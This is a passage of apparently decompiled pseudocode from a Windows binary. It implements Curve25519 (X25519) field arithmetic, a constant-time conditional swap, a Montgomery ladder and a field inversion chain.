              & (~(v55 | v54 | v56 | v53 | v46 | v49 | v42 | v102 | v99) << 16)) << 8)))))
        & v60) >> 31);
  v63 = v76 - (v62 & 0x3FFFFED);
  v64 = v62 & 0x1FFFFFF;
  *a1 = v63;
  v65 = v91 - (v62 & 0x1FFFFFF);
  v66 = (v50 & 0x1FFFFFF) - (v62 & 0x1FFFFFF);
  v67 = 32 * (v87 - (v62 & 0x1FFFFFF));
  v68 = v93 - (v62 & 0x1FFFFFF);
  v62 &= 0x3FFFFFFu;
  v69 = v83 - v62;
  v70 = (v85 - v62) << 6;
  v65 *= 4;
  v66 *= 8;
  v71 = 16 * (v80 - v62);
  v72 = 8 * (v89 - v62);
  v73 = (v78 - v64) << 6;
  v69 *= 2;
  a1[1] = BYTE1(v63);
  a1[2] = BYTE2(v63);
  a1[4] = BYTE1(v65);
  a1[5] = BYTE2(v65);
  a1[7] = BYTE1(v72);
  a1[8] = BYTE2(v72);
  a1[10] = BYTE1(v67);
  a1[11] = BYTE2(v67);
  a1[3] = v65 | HIBYTE(v63);
  a1[6] = v72 | HIBYTE(v65);
  a1[9] = v67 | HIBYTE(v72);
  a1[12] = v70 | HIBYTE(v67);
  a1[13] = BYTE1(v70);
  a1[14] = BYTE2(v70);
  a1[17] = BYTE1(v68);
  a1[18] = BYTE2(v68);
  a1[20] = BYTE1(v69);
  a1[21] = BYTE2(v69);
  a1[23] = BYTE1(v66);
  a1[24] = BYTE2(v66);
  a1[26] = BYTE1(v71);
  a1[27] = BYTE2(v71);
  a1[16] = v68;
  a1[29] = BYTE1(v73);
  result = (unsigned int)(__int16)((v78 - v64) >> 10);
  a1[15] = HIBYTE(v70);
  a1[31] = HIBYTE(v73);
  a1[19] = v69 | HIBYTE(v68);
  a1[22] = v66 | HIBYTE(v69);
  a1[25] = v71 | HIBYTE(v66);
  a1[28] = v73 | HIBYTE(v71);
  a1[30] = result;
  return result;
}


// ----- sub_14000F4B0 @ 0x14000f4b0 -----
unsigned __int64 __fastcall sub_14000F4B0(
        __int64 *a1,
        __int64 *a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __m128i *a6,
        __int64 a7,
        __m128i *a8,
        int *a9)
{
  __m128i v12; // xmm1
  __m128i v13; // xmm2
  __m128i v14; // xmm1
  __m128i v15; // xmm2
  __m128i v16; // xmm1
  __m128i v17; // xmm1
  __m128i v18; // xmm2
  __m128i v19; // xmm1
  __m128i v20; // xmm2
  __m128i v21; // xmm1
  __m128i v22; // xmm0
  __m128i v23; // xmm1
  __m128i v24; // xmm0
  __m128i v25; // xmm1
  __m128i v26; // xmm1
  __m128i v27; // xmm0
  __m128i v28; // xmm1
  __int64 i; // rcx
  __int64 v41; // [rsp+20h] [rbp-E0h] BYREF
  __int64 v42; // [rsp+28h] [rbp-D8h]
  __int64 v43; // [rsp+30h] [rbp-D0h]
  __int64 v44; // [rsp+38h] [rbp-C8h]
  __int64 v45; // [rsp+40h] [rbp-C0h]
  __int64 v46; // [rsp+48h] [rbp-B8h]
  __int64 v47; // [rsp+50h] [rbp-B0h]
  __int64 v48; // [rsp+58h] [rbp-A8h]
  __int64 v49; // [rsp+60h] [rbp-A0h]
  __int64 v50; // [rsp+70h] [rbp-90h]
  __int64 v51; // [rsp+78h] [rbp-88h]
  __int64 v52; // [rsp+80h] [rbp-80h]
  __int64 v53; // [rsp+88h] [rbp-78h]
  __int64 v54; // [rsp+90h] [rbp-70h]
  __int64 v55; // [rsp+98h] [rbp-68h]
  __int64 v56; // [rsp+A0h] [rbp-60h]
  __int64 v57; // [rsp+A8h] [rbp-58h]
  __int64 v58; // [rsp+B0h] [rbp-50h]
  __m128i v59; // [rsp+C0h] [rbp-40h] BYREF
  __m128i v60; // [rsp+D0h] [rbp-30h]
  __m128i v61; // [rsp+E0h] [rbp-20h]
  __m128i v62; // [rsp+F0h] [rbp-10h]
  __m128i v63; // [rsp+100h] [rbp+0h]
  __int64 v64; // [rsp+110h] [rbp+10h]
  __int64 v65; // [rsp+118h] [rbp+18h]
  __int64 v66; // [rsp+120h] [rbp+20h]
  __int64 v67; // [rsp+128h] [rbp+28h]
  __int64 v68; // [rsp+130h] [rbp+30h]
  __int64 v69; // [rsp+138h] [rbp+38h]
  __int64 v70; // [rsp+140h] [rbp+40h]
  __int64 v71; // [rsp+148h] [rbp+48h]
  __int64 v72; // [rsp+150h] [rbp+50h]
  __int64 v73; // [rsp+160h] [rbp+60h] BYREF
  __int64 v74; // [rsp+168h] [rbp+68h]
  __int64 v75; // [rsp+170h] [rbp+70h]
  __int64 v76; // [rsp+178h] [rbp+78h]
  __int64 v77; // [rsp+180h] [rbp+80h]
  __int64 v78; // [rsp+188h] [rbp+88h]
  __int64 v79; // [rsp+190h] [rbp+90h]
  __int64 v80; // [rsp+198h] [rbp+98h]
  __int64 v81; // [rsp+1A0h] [rbp+A0h]
  __int64 v82; // [rsp+1A8h] [rbp+A8h]
  __int64 v83; // [rsp+1B0h] [rbp+B0h]
  __int64 v84; // [rsp+1B8h] [rbp+B8h]
  __int64 v85; // [rsp+1C0h] [rbp+C0h]
  __int64 v86; // [rsp+1C8h] [rbp+C8h]
  __int64 v87; // [rsp+1D0h] [rbp+D0h]
  __int64 v88; // [rsp+1D8h] [rbp+D8h]
  __int64 v89; // [rsp+1E0h] [rbp+E0h]
  __int64 v90; // [rsp+1E8h] [rbp+E8h]
  __int64 v91; // [rsp+1F0h] [rbp+F0h]
  __int64 v92[2]; // [rsp+200h] [rbp+100h] BYREF
  __int128 v93; // [rsp+210h] [rbp+110h]
  __int128 v94; // [rsp+220h] [rbp+120h]
  __int128 v95; // [rsp+230h] [rbp+130h]
  __int128 v96; // [rsp+240h] [rbp+140h]
  _BYTE v97[80]; // [rsp+250h] [rbp+150h] BYREF
  __m128i v98; // [rsp+2A0h] [rbp+1A0h] BYREF
  __m128i v99; // [rsp+2B0h] [rbp+1B0h] BYREF
  __m128i v100; // [rsp+2C0h] [rbp+1C0h] BYREF
  __m128i v101; // [rsp+2D0h] [rbp+1D0h] BYREF
  __m128i v102; // [rsp+2E0h] [rbp+1E0h] BYREF
  __m128i v103; // [rsp+2F0h] [rbp+1F0h] BYREF
  __m128i v104; // [rsp+300h] [rbp+200h] BYREF
  __m128i v105; // [rsp+310h] [rbp+210h] BYREF
  __m128i v106; // [rsp+320h] [rbp+220h] BYREF
  __m128i v107[6]; // [rsp+330h] [rbp+230h] BYREF
  __m128i v108; // [rsp+390h] [rbp+290h] BYREF
  __m128i v109; // [rsp+3A0h] [rbp+2A0h] BYREF
  __m128i v110; // [rsp+3B0h] [rbp+2B0h] BYREF
  __m128i v111; // [rsp+3C0h] [rbp+2C0h] BYREF
  __m128i v112; // [rsp+3D0h] [rbp+2D0h] BYREF
  __m128i v113; // [rsp+430h] [rbp+330h] BYREF
  __m128i v114; // [rsp+440h] [rbp+340h] BYREF
  __m128i v115; // [rsp+450h] [rbp+350h] BYREF
  __m128i v116; // [rsp+460h] [rbp+360h] BYREF
  __m128i v117; // [rsp+470h] [rbp+370h] BYREF
  int v118[40]; // [rsp+480h] [rbp+380h] BYREF
  _BYTE v119[224]; // [rsp+520h] [rbp+420h] BYREF

  sub_140016F80(&v113, a5, 80);
  v12 = _mm_loadu_si128(&v113);
  v13 = _mm_loadu_si128(&v114);
  *(_QWORD *)a5 += a6->m128i_i64[0];
  *(_QWORD *)(a5 + 8) += a6->m128i_i64[1];
  *(_QWORD *)(a5 + 16) += a6[1].m128i_i64[0];
  *(_QWORD *)(a5 + 24) += a6[1].m128i_i64[1];
  *(_QWORD *)(a5 + 32) += a6[2].m128i_i64[0];
  *(_QWORD *)(a5 + 40) += a6[2].m128i_i64[1];
  *(_QWORD *)(a5 + 48) += a6[3].m128i_i64[0];
  *(_QWORD *)(a5 + 56) += a6[3].m128i_i64[1];
  *(_QWORD *)(a5 + 64) += a6[4].m128i_i64[0];
  *(_QWORD *)(a5 + 72) += a6[4].m128i_i64[1];
  *a6 = _mm_sub_epi64(v12, _mm_loadu_si128(a6));
  v14 = _mm_loadu_si128(&v115);
  a6[1] = _mm_sub_epi64(v13, _mm_loadu_si128(a6 + 1));
  v15 = _mm_loadu_si128(&v116);
  a6[2] = _mm_sub_epi64(v14, _mm_loadu_si128(a6 + 2));
  v16 = _mm_loadu_si128(&v117);
  a6[3] = _mm_sub_epi64(v15, _mm_loadu_si128(a6 + 3));
  a6[4] = _mm_sub_epi64(v16, _mm_loadu_si128(a6 + 4));
  sub_140016F80(&v98, a7, 80);
  v17 = _mm_loadu_si128(&v98);
  v18 = _mm_loadu_si128(&v99);
  *(_QWORD *)a7 += a8->m128i_i64[0];
  *(_QWORD *)(a7 + 8) += a8->m128i_i64[1];
  *(_QWORD *)(a7 + 16) += a8[1].m128i_i64[0];
  *(_QWORD *)(a7 + 24) += a8[1].m128i_i64[1];
  *(_QWORD *)(a7 + 32) += a8[2].m128i_i64[0];
  *(_QWORD *)(a7 + 40) += a8[2].m128i_i64[1];
  *(_QWORD *)(a7 + 48) += a8[3].m128i_i64[0];
  *(_QWORD *)(a7 + 56) += a8[3].m128i_i64[1];
  *(_QWORD *)(a7 + 64) += a8[4].m128i_i64[0];
  *(_QWORD *)(a7 + 72) += a8[4].m128i_i64[1];
  *a8 = _mm_sub_epi64(v17, _mm_loadu_si128(a8));
  v19 = _mm_loadu_si128(&v100);
  a8[1] = _mm_sub_epi64(v18, _mm_loadu_si128(a8 + 1));
  v20 = _mm_loadu_si128(&v101);
  a8[2] = _mm_sub_epi64(v19, _mm_loadu_si128(a8 + 2));
  v21 = _mm_loadu_si128(&v102);
  a8[3] = _mm_sub_epi64(v20, _mm_loadu_si128(a8 + 3));
  a8[4] = _mm_sub_epi64(v21, _mm_loadu_si128(a8 + 4));
  sub_14000D9F0(&v73, (int *)a7, a6->m128i_i32);
  sub_14000D9F0(&v59, (int *)a5, a8->m128i_i32);
  v81 += 19 * v91;
  v80 += 19 * v90;
  v79 += 19 * v89;
  v78 += 19 * v88;
  v77 += 19 * v87;
  v76 += 19 * v86;
  v75 += 19 * v85;
  v74 += 19 * v84;
  v73 += 19 * v83;
  sub_14000E0C0(&v73);
  v63.m128i_i64[0] += 19 * v72;
  v62.m128i_i64[1] += 19 * v71;
  v62.m128i_i64[0] += 19 * v70;
  v61.m128i_i64[1] += 19 * v69;
  v61.m128i_i64[0] += 19 * v68;
  v60.m128i_i64[1] += 19 * v67;
  v60.m128i_i64[0] += 19 * v66;
  v59.m128i_i64[1] += 19 * v65;
  v59.m128i_i64[0] += 19 * v64;
  sub_14000E0C0(v59.m128i_i64);
  sub_140016F80(&v98, &v73, 80);
  v73 += v59.m128i_i64[0];
  v74 += v59.m128i_i64[1];
  v75 += v60.m128i_i64[0];
  v76 += v60.m128i_i64[1];
  v77 += v61.m128i_i64[0];
  v78 += v61.m128i_i64[1];
  v79 += v62.m128i_i64[0];
  v80 += v62.m128i_i64[1];
  v81 += v63.m128i_i64[0];
  v22 = _mm_sub_epi64(_mm_loadu_si128(&v98), v59);
  v23 = _mm_sub_epi64(_mm_loadu_si128(&v99), v60);
  v82 += v63.m128i_i64[1];
  v59 = v22;
  v61 = _mm_sub_epi64(_mm_loadu_si128(&v100), v61);
  v24 = _mm_sub_epi64(_mm_loadu_si128(&v102), v63);
  v60 = v23;
  v25 = _mm_sub_epi64(_mm_loadu_si128(&v101), v62);
  v63 = v24;
  v62 = v25;
  sub_14000E370(&v41, (int *)&v73);
  v49 += 19 * v58;
  v48 += 19 * v57;
  v47 += 19 * v56;
  v46 += 19 * v55;
  v45 += 19 * v54;
  v44 += 19 * v53;
  v43 += 19 * v52;
  v42 += 19 * v51;
  v41 += 19 * v50;
  sub_14000E0C0(&v41);
  sub_140016F80(v119, &v41, 80);
  sub_14000E370(&v41, v59.m128i_i32);
  v49 += 19 * v58;
  v48 += 19 * v57;
  v47 += 19 * v56;
  v46 += 19 * v55;
  v45 += 19 * v54;
  v44 += 19 * v53;
  v43 += 19 * v52;
  v42 += 19 * v51;
  v41 += 19 * v50;
  sub_14000E0C0(&v41);
  sub_140016F80(v118, &v41, 80);
  sub_14000D9F0(&v59, v118, a9);
  v63.m128i_i64[0] += 19 * v72;
  v62.m128i_i64[1] += 19 * v71;
  v62.m128i_i64[0] += 19 * v70;
  v61.m128i_i64[1] += 19 * v69;
  v61.m128i_i64[0] += 19 * v68;
  v60.m128i_i64[1] += 19 * v67;
  v60.m128i_i64[0] += 19 * v66;
  v59.m128i_i64[1] += 19 * v65;
  v59.m128i_i64[0] += 19 * v64;
  sub_14000E0C0(v59.m128i_i64);
  sub_140016F80(a3, v119, 80);
  sub_140016F80(a4, &v59, 80);
  sub_14000E370(&v41, (int *)a5);
  v49 += 19 * v58;
  v48 += 19 * v57;
  v47 += 19 * v56;
  v46 += 19 * v55;
  v45 += 19 * v54;
  v44 += 19 * v53;
  v43 += 19 * v52;
  v42 += 19 * v51;
  v41 += 19 * v50;
  sub_14000E0C0(&v41);
  sub_140016F80(&v108, &v41, 80);
  sub_14000E370(&v41, a6->m128i_i32);
  v49 += 19 * v58;
  v48 += 19 * v57;
  v47 += 19 * v56;
  v46 += 19 * v55;
  v45 += 19 * v54;
  v44 += 19 * v53;
  v43 += 19 * v52;
  v42 += 19 * v51;
  v41 += 19 * v50;
  sub_14000E0C0(&v41);
  sub_140016F80(&v103, &v41, 80);
  sub_14000D9F0(a1, v108.m128i_i32, v103.m128i_i32);
  a1[8] += 19 * a1[18];
  a1[7] += 19 * a1[17];
  a1[6] += 19 * a1[16];
  a1[5] += 19 * a1[15];
  a1[4] += 19 * a1[14];
  a1[3] += 19 * a1[13];
  a1[2] += 19 * a1[12];
  a1[1] += 19 * a1[11];
  *a1 += 19 * a1[10];
  sub_14000E0C0(a1);
  v26 = _mm_sub_epi64(_mm_loadu_si128(&v109), v104);
  v103 = _mm_sub_epi64(_mm_loadu_si128(&v108), v103);
  v105 = _mm_sub_epi64(_mm_loadu_si128(&v110), v105);
  v27 = _mm_sub_epi64(_mm_loadu_si128(&v112), v107[0]);
  v104 = v26;
  v28 = _mm_sub_epi64(_mm_loadu_si128(&v111), v106);
  v107[0] = v27;
  v106 = v28;
  sub_140016F40(v97, 0, 72);
  if ( dword_140026610 < 6 )
  {
    for ( i = 0; i != 10; ++i )
      v92[i] = 121665 * v103.m128i_i64[i];
  }
  else
  {
    _XMM0 = _mm_loadu_si128(&v103);
    _XMM2 = _mm_loadu_si128(&v104);
    __asm
    {
      vpmullq xmm1, xmm0, xmm3
      vpmullq xmm0, xmm2, xmm3
    }
    *(_OWORD *)v92 = _XMM1;
    _XMM1 = _mm_loadu_si128(&v105);
    __asm { vpmullq xmm2, xmm1, xmm3 }
    v93 = _XMM0;
    _XMM0 = _mm_loadu_si128(&v106);
    __asm { vpmullq xmm1, xmm0, xmm3 }
    v94 = _XMM2;
    _XMM2 = _mm_loadu_si128(v107);
    __asm { vpmullq xmm0, xmm2, xmm3 }
    v96 = _XMM0;
    v95 = _XMM1;
  }
  sub_14000E0C0(v92);
  v92[0] += v108.m128i_i64[0];
  v92[1] += v108.m128i_i64[1];
  *(_QWORD *)&v93 = v109.m128i_i64[0] + v93;
  *((_QWORD *)&v93 + 1) += v109.m128i_i64[1];
  *(_QWORD *)&v94 = v110.m128i_i64[0] + v94;
  *((_QWORD *)&v94 + 1) += v110.m128i_i64[1];
  *(_QWORD *)&v95 = v111.m128i_i64[0] + v95;
  *((_QWORD *)&v95 + 1) += v111.m128i_i64[1];
  *(_QWORD *)&v96 = v112.m128i_i64[0] + v96;
  *((_QWORD *)&v96 + 1) += v112.m128i_i64[1];
  sub_14000D9F0(a2, v103.m128i_i32, (int *)v92);
  a2[8] += 19 * a2[18];
  a2[7] += 19 * a2[17];
  a2[6] += 19 * a2[16];
  a2[5] += 19 * a2[15];
  a2[4] += 19 * a2[14];
  a2[3] += 19 * a2[13];
  a2[2] += 19 * a2[12];
  a2[1] += 19 * a2[11];
  *a2 += 19 * a2[10];
  return sub_14000E0C0(a2);
}


// ----- sub_14000FE10 @ 0x14000fe10 -----
__int64 __fastcall sub_14000FE10(int *a1, int *a2, int a3)
{
  int v5; // r8d
  __int64 v6; // r9
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // rcx
  __int64 v10; // rcx
  __int64 v11; // rcx
  __int64 v12; // rcx
  __int64 v13; // rcx
  __int64 v14; // rcx
  __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 result; // rax

  v5 = -a3;
  v6 = v5 & (*a2 ^ *a1);
  *(_QWORD *)a1 = v6 ^ *a1;
  *(_QWORD *)a2 = v6 ^ *a2;
  v7 = a1[2];
  v8 = v5 & (a2[2] ^ a1[2]);
  *((_QWORD *)a1 + 1) = v8 ^ v7;
  *((_QWORD *)a2 + 1) = v8 ^ a2[2];
  v9 = v5 & (a2[4] ^ a1[4]);
  *((_QWORD *)a1 + 2) = v9 ^ a1[4];
  *((_QWORD *)a2 + 2) = v9 ^ a2[4];
  v10 = v5 & (a2[6] ^ a1[6]);
  *((_QWORD *)a1 + 3) = v10 ^ a1[6];
  *((_QWORD *)a2 + 3) = v10 ^ a2[6];
  v11 = v5 & (a2[8] ^ a1[8]);
  *((_QWORD *)a1 + 4) = v11 ^ a1[8];
  *((_QWORD *)a2 + 4) = v11 ^ a2[8];
  v12 = v5 & (a2[10] ^ a1[10]);
  *((_QWORD *)a1 + 5) = v12 ^ a1[10];
  *((_QWORD *)a2 + 5) = v12 ^ a2[10];
  v13 = v5 & (a2[12] ^ a1[12]);
  *((_QWORD *)a1 + 6) = v13 ^ a1[12];
  *((_QWORD *)a2 + 6) = v13 ^ a2[12];
  v14 = v5 & (a2[14] ^ a1[14]);
  *((_QWORD *)a1 + 7) = v14 ^ a1[14];
  *((_QWORD *)a2 + 7) = v14 ^ a2[14];
  v15 = v5 & (a2[16] ^ a1[16]);
  *((_QWORD *)a1 + 8) = v15 ^ a1[16];
  *((_QWORD *)a2 + 8) = v15 ^ a2[16];
  v16 = v5 & (a2[18] ^ a1[18]);
  *((_QWORD *)a1 + 9) = v16 ^ a1[18];
  result = v16 ^ a2[18];
  *((_QWORD *)a2 + 9) = result;
  return result;
}


// ----- sub_14000FF90 @ 0x14000ff90 -----
__int64 __fastcall sub_14000FF90(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 v4; // rdi
  int *v5; // r14
  __m128i *v6; // r15
  int *v7; // rsi
  __m128i *v8; // rbx
  int *v9; // r12
  int *v10; // r13
  unsigned int v11; // edx
  unsigned __int8 v12; // al
  unsigned __int64 v13; // rdi
  int *v14; // rax
  __int64 *v15; // rdi
  __m128i *v16; // rcx
  __m128i *v17; // rax
  bool v18; // zf
  unsigned __int8 v20; // [rsp+50h] [rbp-B0h]
  unsigned int v21; // [rsp+54h] [rbp-ACh]
  __int64 *v22; // [rsp+58h] [rbp-A8h]
  __int64 *v23; // [rsp+60h] [rbp-A0h]
  int v24; // [rsp+68h] [rbp-98h]
  _QWORD v25[18]; // [rsp+70h] [rbp-90h] BYREF
  __int64 v26; // [rsp+100h] [rbp+0h]
  _QWORD v27[18]; // [rsp+110h] [rbp+10h] BYREF
  __int64 v28; // [rsp+1A0h] [rbp+A0h]
  _QWORD v29[18]; // [rsp+1B0h] [rbp+B0h] BYREF
  __int64 v30; // [rsp+240h] [rbp+140h]
  _QWORD v31[18]; // [rsp+250h] [rbp+150h] BYREF
  __int64 v32; // [rsp+2E0h] [rbp+1E0h]
  _QWORD v33[18]; // [rsp+2F0h] [rbp+1F0h] BYREF
  __int64 v34; // [rsp+380h] [rbp+280h]
  _QWORD v35[18]; // [rsp+390h] [rbp+290h] BYREF
  __int64 v36; // [rsp+420h] [rbp+320h]
  _QWORD v37[18]; // [rsp+430h] [rbp+330h] BYREF
  __int64 v38; // [rsp+4C0h] [rbp+3C0h]
  _QWORD v39[18]; // [rsp+4D0h] [rbp+3D0h] BYREF
  __int64 v40; // [rsp+560h] [rbp+460h]

  v22 = v39;
  v4 = a3;
  v23 = v31;
  v5 = (int *)v33;
  v6 = (__m128i *)v25;
  v34 = 0;
  v7 = (int *)v27;
  v26 = 0;
  v8 = (__m128i *)v35;
  v28 = 0;
  v9 = (int *)v37;
  v36 = 0;
  v10 = (int *)v29;
  v38 = 0;
  v30 = 0;
  memset(v33, 0, sizeof(v33));
  memset(&v25[2], 0, 128);
  memset(&v27[2], 0, 128);
  memset(v35, 0, sizeof(v35));
  memset(v37, 0, sizeof(v37));
  memset(&v29[2], 0, 128);
  memset(v39, 0, sizeof(v39));
  *(_OWORD *)v31 = 1u;
  v40 = 0;
  v32 = 0;
  *(_OWORD *)v25 = 1u;
  *(_OWORD *)v27 = 1u;
  memset(&v31[2], 0, 128);
  *(_OWORD *)v29 = 1u;
  sub_140016F80(v33, a4, 80);
  v11 = 0;
  v21 = 0;
  do
  {
    v24 = 8;
    v12 = *(_BYTE *)(v4 + 31 - v11);
    v20 = v12;
    do
    {
      v13 = (unsigned __int64)v12 >> 7;
      sub_14000FE10(v7, v5, v13);
      sub_14000FE10(v8->m128i_i32, v6->m128i_i32, v13);
      sub_14000F4B0(v22, v23, (__int64)v9, (__int64)v10, (__int64)v7, v8, (__int64)v5, v6, a4);
      sub_14000FE10((int *)v22, v9, v13);
      sub_14000FE10((int *)v23, v10, v13);
      v14 = v5;
      v15 = (__int64 *)v7;
      v7 = (int *)v22;
      v16 = v8;
      v8 = (__m128i *)v23;
      v5 = v9;
      v9 = v14;
      v22 = v15;
      v17 = v6;
      v23 = (__int64 *)v16;
      v6 = (__m128i *)v10;
      v10 = (int *)v17;
      v12 = 2 * v20;
      v18 = v24-- == 1;
      v20 *= 2;
    }
    while ( !v18 );
    v11 = v21 + 1;
    v22 = v15;
    v4 = a3;
    v21 = v11;
    v23 = (__int64 *)v16;
  }
  while ( v11 < 0x20 );
  sub_140016F80(a1, v7, 80);
  return sub_140016F80(a2, v8, 80);
}


// ----- sub_1400103A0 @ 0x1400103a0 -----
__int64 __fastcall sub_1400103A0(__int64 a1, int *a2)
{
  int v4; // edi
  int i; // ebx
  int j; // ebx
  int v7; // ebx
  int k; // edi
  int m; // edi
  __int64 v11; // [rsp+20h] [rbp-E0h] BYREF
  __int64 v12; // [rsp+28h] [rbp-D8h]
  __int64 v13; // [rsp+30h] [rbp-D0h]
  __int64 v14; // [rsp+38h] [rbp-C8h]
  __int64 v15; // [rsp+40h] [rbp-C0h]
  __int64 v16; // [rsp+48h] [rbp-B8h]
  __int64 v17; // [rsp+50h] [rbp-B0h]
  __int64 v18; // [rsp+58h] [rbp-A8h]
  __int64 v19; // [rsp+60h] [rbp-A0h]
  __int64 v20; // [rsp+70h] [rbp-90h]
  __int64 v21; // [rsp+78h] [rbp-88h]
  __int64 v22; // [rsp+80h] [rbp-80h]
  __int64 v23; // [rsp+88h] [rbp-78h]
  __int64 v24; // [rsp+90h] [rbp-70h]
  __int64 v25; // [rsp+98h] [rbp-68h]
  __int64 v26; // [rsp+A0h] [rbp-60h]
  __int64 v27; // [rsp+A8h] [rbp-58h]
  __int64 v28; // [rsp+B0h] [rbp-50h]
  int v29[20]; // [rsp+C0h] [rbp-40h] BYREF
  int v30[20]; // [rsp+110h] [rbp+10h] BYREF
  int v31[20]; // [rsp+160h] [rbp+60h] BYREF
  int v32[20]; // [rsp+1B0h] [rbp+B0h] BYREF
  int v33[20]; // [rsp+200h] [rbp+100h] BYREF
  int v34[20]; // [rsp+250h] [rbp+150h] BYREF
  int v35[20]; // [rsp+2A0h] [rbp+1A0h] BYREF
  int v36[20]; // [rsp+2F0h] [rbp+1F0h] BYREF
  int v37[20]; // [rsp+340h] [rbp+240h] BYREF
  int v38[28]; // [rsp+390h] [rbp+290h] BYREF

  sub_14000E6E0((__int64)v33, a2);
  sub_14000E6E0((__int64)v30, v33);
  sub_14000E6E0((__int64)v29, v30);
  sub_14000E2C0((__int64)v34, v29, a2);
  sub_14000D9F0(&v11, v34, v33);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v38, &v11, 80);
  sub_14000E6E0((__int64)v29, v38);
  sub_14000D9F0(&v11, v29, v34);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v35, &v11, 80);
  sub_14000E6E0((__int64)v29, v35);
  sub_14000E6E0((__int64)v30, v29);
  sub_14000E6E0((__int64)v29, v30);
  sub_14000E6E0((__int64)v30, v29);
  sub_14000E6E0((__int64)v29, v30);
  sub_14000D9F0(&v11, v29, v35);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v31, &v11, 80);
  sub_14000E6E0((__int64)v29, v31);
  sub_14000E6E0((__int64)v30, v29);
  v4 = 4;
  for ( i = 4; i != 0; --i )
  {
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
  }
  sub_14000D9F0(&v11, v30, v31);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v36, &v11, 80);
  sub_14000E370(&v11, v36);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  for ( j = 9; j != 0; --j )
  {
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
  }
  sub_14000D9F0(&v11, v30, v36);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  sub_14000E370(&v11, v29);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v30, &v11, 80);
  sub_14000E370(&v11, v30);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
  v13 += 19 * v22;
  v12 += 19 * v21;
  v11 += 19 * v20;
  sub_14000E0C0(&v11);
  sub_140016F80(v29, &v11, 80);
  do
  {
    sub_14000E370(&v11, v29);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v30, &v11, 80);
    sub_14000E370(&v11, v30);
    v19 += 19 * v28;
    v18 += 19 * v27;
    v17 += 19 * v26;
    v16 += 19 * v25;
    v15 += 19 * v24;
    v14 += 19 * v23;
    v13 += 19 * v22;
    v12 += 19 * v21;
    v11 += 19 * v20;
    sub_14000E0C0(&v11);
    sub_140016F80(v29, &v11, 80);
    --v4;
  }
  while ( v4 != 0 );
  sub_14000D9F0(&v11, v29, v31);
  v19 += 19 * v28;
  v18 += 19 * v27;
  v17 += 19 * v26;
  v16 += 19 * v25;
  v15 += 19 * v24;
  v14 += 19 * v23;
